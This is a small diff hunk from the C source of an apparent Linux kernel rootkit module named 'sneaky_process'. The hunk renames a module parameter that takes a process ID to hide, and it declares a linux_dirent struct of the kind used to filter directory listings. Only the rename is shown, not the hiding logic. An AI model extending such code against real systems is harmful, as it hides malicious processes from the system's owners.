@@ -10,9 +10,9 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
-static int sneaky_pid = 0;
-module_param(sneaky_pid, int, 0);
-MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+static int pid = 0;
+module_param(pid, int, 0);
+MODULE_PARM_DESC(pid, "sneaky_pid");
 struct linux_dirent
 {
   u64 d_ino;
